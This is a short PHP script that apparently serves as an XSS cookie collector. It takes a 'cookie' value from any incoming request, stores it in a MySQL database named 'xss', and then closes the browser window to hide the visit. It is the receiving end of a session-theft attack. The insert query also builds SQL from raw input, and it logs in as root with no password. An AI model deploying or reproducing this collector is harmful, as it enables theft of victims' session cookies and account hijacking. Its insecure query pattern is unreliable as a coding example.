<?php
$cookie = $_REQUEST['cookie'];
$l = new mysqli("127.0.0.1", "root", "", "xss");
$l->query("INSERT INTO data_cookie (cookie) VALUES ('$cookie')");
$l->close();
echo "Loading...";
echo "<script>window.close()</script>";
?>